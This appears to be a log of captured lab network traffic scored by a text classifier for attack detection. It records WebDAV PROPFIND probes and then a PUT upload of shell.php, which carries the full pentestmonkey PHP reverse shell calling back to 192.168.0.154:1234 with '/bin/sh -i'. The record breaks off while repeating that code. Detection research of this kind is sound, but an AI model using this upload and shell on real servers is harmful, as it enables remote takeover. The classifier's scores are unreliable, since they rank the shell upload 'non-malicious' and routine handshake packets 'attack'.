Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=44555 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa4d src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392180 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975651441, 0)), ('NOP', None), ('WScale', 7)] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=44555 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa4d src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392180 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975651441, 0)), ('NOP', None), ('WScale', 7)] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.3586040735244751, 0.3401007056236267, 0.18112216889858246, 0.12017307430505753]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44556 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa54 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651442, 6175878))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44556 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa54 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651442, 6175878))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.3699101209640503, 0.336893230676651, 0.1676131635904312, 0.12558354437351227]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=44557 flags=DF frag=0 ttl=64 proto=tcp chksum=0x93b src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651476, 6175878))] |<Raw  load='PROPFIND /uploads/ HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 90\r\nContent-Type: text/xml\r\nDepth: 0\r\n\r\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' |>>>
    
String processed with result = {'sequence': '\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=44557 flags=DF frag=0 ttl=64 proto=tcp chksum=0x93b src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392181 ack=741302054 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975651476, 6175878))] |<Raw  load=\'PROPFIND /uploads/ HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 90\\r\\nContent-Type: text/xml\\r\\nDepth: 0\\r\\n\\r\\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>\' |>>>\n    ', 'labels': ['normal', 'attack', 'non-malicious', 'malicious'], 'scores': [0.4826388359069824, 0.28123414516448975, 0.15835686028003693, 0.07777014374732971]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44558 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa52 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303088 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651477, 6175887))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44558 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa52 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303088 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651477, 6175887))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.3789260685443878, 0.32824069261550903, 0.16630998253822327, 0.12652327120304108]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44559 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa51 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303089 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651479, 6175887))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=44559 flags=DF frag=0 ttl=64 proto=tcp chksum=0xa51 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44392 dport=http seq=3940392461 ack=741303089 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975651479, 6175887))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.38158509135246277, 0.32053589820861816, 0.16947011649608612, 0.12840889394283295]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=62342 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d1 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901991 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655197, 0)), ('NOP', None), ('WScale', 7)] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=62342 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d1 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901991 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655197, 0)), ('NOP', None), ('WScale', 7)] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.38386985659599304, 0.33091095089912415, 0.1652478277683258, 0.1199713945388794]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62343 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655197, 6176817))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62343 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655197, 6176817))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.38025161623954773, 0.32995590567588806, 0.1670609712600708, 0.1227315366268158]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=62344 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc3bf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655198, 6176817))] |<Raw  load='PROPFIND /uploads/ HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 90\r\nContent-Type: text/xml\r\nDepth: 0\r\n\r\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' |>>>
    
String processed with result = {'sequence': '\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=332 id=62344 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc3bf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310901992 ack=425535277 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83a2 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975655198, 6176817))] |<Raw  load=\'PROPFIND /uploads/ HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 90\\r\\nContent-Type: text/xml\\r\\nDepth: 0\\r\\n\\r\\n<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>\' |>>>\n    ', 'labels': ['normal', 'attack', 'non-malicious', 'malicious'], 'scores': [0.414826363325119, 0.33481472730636597, 0.16747735440731049, 0.08288149535655975]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62345 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536311 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655202, 6176818))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62345 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536311 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655202, 6176818))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.3872215449810028, 0.32053062319755554, 0.1676952987909317, 0.12455252557992935]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62346 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536312 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655203, 6176818))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=62346 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc4d5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44404 dport=http seq=3310902272 ack=425536312 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655203, 6176818))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.39070364832878113, 0.31541958451271057, 0.16742835938930511, 0.12644842267036438]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=11186 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302204 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655208, 0)), ('NOP', None), ('WScale', 7)] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=11186 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302204 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975655208, 0)), ('NOP', None), ('WScale', 7)] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.36909717321395874, 0.3420408070087433, 0.1738710105419159, 0.11499104648828506]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11187 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8cad src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655209, 6176820))] |>>
    
String processed with result = {'sequence': "\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11187 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8cad src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655209, 6176820))] |>>\n    ", 'labels': ['attack', 'normal', 'non-malicious', 'malicious'], 'scores': [0.3808271288871765, 0.32928410172462463, 0.1703128069639206, 0.11957596987485886]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    As the payload is large, we will split the payload into 8 parts.
    Here is part 1 of the payload:
    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655210, 6176820))] |<Raw  load='PUT /uploads/shell.php HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 5495\r\n\r\n<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = "1.0";\n$ip = \'192.168.0.154\';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; /bin/sh -i\';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists(\'pcntl_fork\')) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can\'t fork");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\n\t// Make the current process a session leader\n\t// Will only succeed if we forked\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can\'t setsid()");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n}\n\n// Change to a safe directory\nchdir("/");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit("ERROR: Can\'t spawn shell");\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won\'t\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit("Successfully opened reverse shell to $ip:$port");\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process\'s STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process\'s STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process\'s STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we\'ve daemonised ourself\n// (I can\'t figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\\n";\n\t}\n}\n\n?> \n\n\n\n' |>>>
    
String processed with result = {'sequence': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 1 of the payload:\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975655210, 6176820))] |<Raw  load=\'PUT /uploads/shell.php HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 5495\\r\\n\\r\\n<?php\\n// php-reverse-shell - A Reverse Shell implementation in PHP\\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  The author accepts no liability\\n// for damage caused by this tool.  If these terms are not acceptable to you, then\\n// do not use this tool.\\n//\\n// In all other respects the GPL version 2 applies:\\n//\\n// This program is free software; you can redistribute it and/or modify\\n// it under the terms of the GNU General Public License version 2 as\\n// published by the Free Software Foundation.\\n//\\n// This program is distributed in the hope that it will be useful,\\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n// GNU General Public License for more details.\\n//\\n// You should have received a copy of the GNU General Public License along\\n// with this program; if not, write to the Free Software Foundation, Inc.,\\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  If these terms are not acceptable to\\n// you, then do not use this tool.\\n//\\n// You are encouraged to send comments, improvements or suggestions to\\n// me at pentestmonkey@pentestmonkey.net\\n//\\n// Description\\n// -----------\\n// This script will make an outbound TCP connection to a hardcoded IP and port.\\n// The recipient will be given a shell running as the current user (apache normally).\\n//\\n// Limitations\\n// -----------\\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\\n//\\n// Usage\\n// -----\\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\\n\\nset_time_limit (0);\\n$VERSION = "1.0";\\n$ip = \\\'192.168.0.154\\\';  // CHANGE THIS\\n$port = 1234;       // CHANGE THIS\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = \\\'uname -a; w; id; /bin/sh -i\\\';\\n$daemon = 0;\\n$debug = 0;\\n\\n//\\n// Daemonise ourself if possible to avoid zombies later\\n//\\n\\n// pcntl_fork is hardly ever available, but will allow us to daemonise\\n// our php process and avoid zombies.  Worth a try...\\nif (function_exists(\\\'pcntl_fork\\\')) {\\n\\t// Fork and have the parent process exit\\n\\t$pid = pcntl_fork();\\n\\t\\n\\tif ($pid == -1) {\\n\\t\\tprintit("ERROR: Can\\\'t fork");\\n\\t\\texit(1);\\n\\t}\\n\\t\\n\\tif ($pid) {\\n\\t\\texit(0);  // Parent exits\\n\\t}\\n\\n\\t// Make the current process a session leader\\n\\t// Will only succeed if we forked\\n\\tif (posix_setsid() == -1) {\\n\\t\\tprintit("Error: Can\\\'t setsid()");\\n\\t\\texit(1);\\n\\t}\\n\\n\\t$daemon = 1;\\n} else {\\n\\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\\n}\\n\\n// Change to a safe directory\\nchdir("/");\\n\\n// Remove any umask we inherited\\numask(0);\\n\\n//\\n// Do the reverse shell...\\n//\\n\\n// Open reverse connection\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {\\n\\tprintit("$errstr ($errno)");\\n\\texit(1);\\n}\\n\\n// Spawn shell process\\n$descriptorspec = array(\\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\\n);\\n\\n$process = proc_open($shell, $descriptorspec, $pipes);\\n\\nif (!is_resource($process)) {\\n\\tprintit("ERROR: Can\\\'t spawn shell");\\n\\texit(1);\\n}\\n\\n// Set everything to non-blocking\\n// Reason: Occsionally reads will block, even though stream_select tells us they won\\\'t\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\n\\nprintit("Successfully opened reverse shell to $ip:$port");\\n\\nwhile (1) {\\n\\t// Check for end of TCP connection\\n\\tif (feof($sock)) {\\n\\t\\tprintit("ERROR: Shell connection terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Check for end of STDOUT\\n\\tif (feof($pipes[1])) {\\n\\t\\tprintit("ERROR: Shell process terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Wait until a command is end down $sock, or some\\n\\t// command output is available on STDOUT or STDERR\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\n\\t// If we can read from the TCP socket, send\\n\\t// data to process\\\'s STDIN\\n\\tif (in_array($sock, $read_a)) {\\n\\t\\tif ($debug) printit("SOCK READ");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit("SOCK: $input");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDOUT\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[1], $read_a)) {\\n\\t\\tif ($debug) printit("STDOUT READ");\\n\\t\\t$input = fread($pipes[1], $chunk_size);\\n\\t\\tif ($debug) printit("STDOUT: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDERR\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[2], $read_a)) {\\n\\t\\tif ($debug) printit("STDERR READ");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit("STDERR: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\n\\n// Like print, but does nothing if we\\\'ve daemonised ourself\\n// (I can\\\'t figure out how to redirect STDOUT like a proper daemon)\\nfunction printit ($string) {\\n\\tif (!$daemon) {\\n\\t\\tprint "$string\\\\n";\\n\\t}\\n}\\n\\n?> \\n\\n\\n\\n\' |>>>\n    ', 'labels': ['non-malicious', 'normal', 'attack', 'malicious'], 'scores': [0.3165987432003021, 0.2786649763584137, 0.20889972150325775, 0.19583649933338165]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:


    As the payload is large, we will split the payload into 8 parts.
    Here is part 2 of the payload:
    Protocol: IP
    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655210, 6176820))] |<Raw  load='PUT /uploads/shell.php HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 192.168.0.121:80\r\nUser-Agent: dave/v2.01 (perldav)\r\nContent-Length: 5495\r\n\r\n<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this 